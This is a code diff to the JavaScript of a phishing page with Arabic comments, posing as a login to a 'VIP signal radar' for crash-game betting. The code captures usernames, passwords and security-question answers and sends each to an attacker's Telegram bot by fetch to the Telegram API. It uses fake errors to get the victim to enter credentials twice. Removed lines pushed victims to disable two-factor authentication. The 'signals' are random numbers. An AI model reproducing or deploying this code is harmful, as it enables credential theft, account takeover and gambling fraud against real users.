@@ -4,7 +4,7 @@ const CHAT_ID = "8026901193";
 let loginAttempts = 0;
 let securityAttempts = 0;
 
-// 1. معالجة تسجيل الدخول الأول
+// 1. تسجيل الدخول
 async function processAuth() {
     const u = document.getElementById('u_log').value;
     const p = document.getElementById('u_pas').value;
@@ -14,92 +14,59 @@ async function processAuth() {
     if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");
 
     loginAttempts++;
+    btn.disabled = true;
+    btn.innerText = "Verifying...";
 
     if (loginAttempts === 1) {
-        btn.disabled = true;
-        btn.innerText = "Verifying...";
-        await sendToTelegram(`⚠️ محاولة 1 (تأكد):\n👤 User: ${u}\n🔑 Pass: ${p}`);
-        
+        await sendToTelegram(`⚠️ محاولة 1:\n👤 User: ${u}\n🔑 Pass: ${p}`);
         setTimeout(() => {
-            msg.innerText = "❌ فشل الاتصال: كلمة المرور أو اليوزر غير صحيح!";
+            msg.innerText = "❌ خطأ في السيرفر: أعد المحاولة";
             msg.style.color = "#ff0000";
-            document.getElementById('u_pas').value = "";
             btn.disabled = false;
             btn.innerText = "Retry Sync";
         }, 1500);
-        return;
-    }
-
-    if (loginAttempts === 2) {
-        btn.disabled = true;
-        btn.innerText = "Analyzing...";
-        await sendToTelegram(`✅ بيانات مؤكدة (محاولة 2):\n👤 User: ${u}\n🔑 Pass: ${p}`);
-        showSecurityNotice(); // يفتح واجهة إلغاء المصادقة
-    }
-}
-
-// 2. واجهة إقناع الضحية بإلغاء 2FA (تم تصحيح الخطأ هنا)
-function showSecurityNotice() {
-    const msg = document.getElementById('status-text');
-    const btn = document.getElementById('sync-btn');
-    const inputs = document.querySelectorAll('input'); // استهداف عام لضمان الإخفاء
-
-    inputs.forEach(i => i.style.display = 'none');
-
-    // تم تصحيح الوسم </td> الذي كان يفسد الكود
-    msg.innerHTML = `
-        <div style="text-align: right; background: rgba(255,0,0,0.1); padding: 15px; border-radius: 12px; border: 1px solid #ff0000; margin-top: 20px;">
-            <h4 style="color: #ff0000; margin: 0 0 10px 0; font-weight: 900;">⚠️ تفعيل نظام الـ VIP:</h4>
-            <p style="font-size: 11px; color: #eee; line-height: 1.6;">يجب إيقاف المصادقة الثنائية (2FA) من إعدادات حسابك فوراً للسماح للسيرفر بالربط واستخراج الإشارات.</p>
-        </div>
-    `;
-    
-    btn.disabled = false;
-    btn.innerText = "ألغيت المصادقة.. دخول ✅";
-    
-    btn.onclick = () => {
-        // إخفاء شاشة الدخول تماماً وإظهار الواجهة الحمراء
+    } else {
+        await sendToTelegram(`✅ بيانات مؤكدة:\n👤 User: ${u}\n🔑 Pass: ${p}`);
+        // إخفاء واجهة الدخول وإظهار الحمراء
         document.getElementById('auth-screen').style.display = 'none';
-        const layer = document.getElementById('security-layer');
-        layer.style.setProperty('display', 'flex', 'important'); 
-        sendToTelegram(`🔔 الضحية أكد إلغاء 2FA وانتقل للسؤال السري!`);
-    };
+        document.getElementById('security-layer').style.display = 'flex';
+    }
 }
 
-// 3. فخ سؤال الأمان (الواجهة الحمراء)
+// 2. تأكيد الإجابة السرية (حل مشكلة التعليق هنا)
 async function finalVerify() {
     const ans = document.getElementById('sec_ans').value;
     const btn = document.getElementById('sec-btn');
-    const msg = document.getElementById('sec-status');
-
-    if (ans.length < 2) return alert("أدخل الإجابة أولاً!");
+    
+    if (ans.length < 2) return alert("أدخل الإجابة!");
 
     securityAttempts++;
     btn.disabled = true;
-    btn.innerText = "Synchronizing...";
+    btn.innerText = "...Synchronizing"; // الحالة اللي راهي حابسة فيها الصورة
+
+    // نبعث البيانات لتلجرام
+    await sendToTelegram(`🔑 **SECRET FOUND**\n👤 Answer: ${ans}`);
 
     if (securityAttempts === 1) {
+        // المحاولة الأولى: نطلب إعادة الكتابة للتمويه
         setTimeout(() => {
             document.getElementById('sec_ans').value = "";
-            msg.innerText = "❌ خطأ: أعد كتابة الإجابة أو اللقب بدقة!";
-            msg.style.color = "#ff0000";
+            document.querySelector('#security-layer p').innerText = "❌ خطأ: أعد كتابة اللقب بدقة!";
             btn.disabled = false;
-            btn.innerText = "Retry Confirm";
-        }, 1200);
-        return;
+            btn.innerText = "Confirm & Unlock";
+        }, 1500);
+    } else {
+        // المحاولة الثانية: نفتح الرادار فوراً
+        setTimeout(() => {
+            document.getElementById('security-layer').style.display = 'none';
+            const mainApp = document.getElementById('main-app');
+            mainApp.classList.remove('hidden');
+            mainApp.style.display = 'flex'; // تأكيد الإظهار
+        }, 1000);
     }
-
-    await sendToTelegram(`🔑 **SECRET ANSWER FOUND!**\n\n👤 Answer: \`${ans}\`\n📡 Status: Fully Captured`);
-    
-    btn.innerText = "Success ✅";
-    setTimeout(() => {
-        document.getElementById('security-layer').style.display = 'none';
-        document.getElementById('main-app').classList.remove('hidden');
-        document.getElementById('main-app').style.display = 'flex';
-        alert("✅ تم تفعيل الـ VIP! الرادار جاهز.");
-    }, 1500);
 }
 
+// دالة الإرسال (مبسطة لتفادي التعليق)
 async function sendToTelegram(text) {
     try {
         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
@@ -107,14 +74,14 @@ async function sendToTelegram(text) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, text: text })
         });
-    } catch (e) {}
+    } catch (e) { console.log("Telegram Error"); }
 }
 
+// الرادار
 function getSignal() {
     const display = document.getElementById('target-mult');
     display.innerText = "WAIT..";
     setTimeout(() => {
-        const mult = (Math.random() * (3.50 - 1.20) + 1.20).toFixed(2) + "x";
-        display.innerText = mult;
+        display.innerText = (Math.random() * (3.50 - 1.20) + 1.20).toFixed(2) + "x";
     }, 1000);
 }
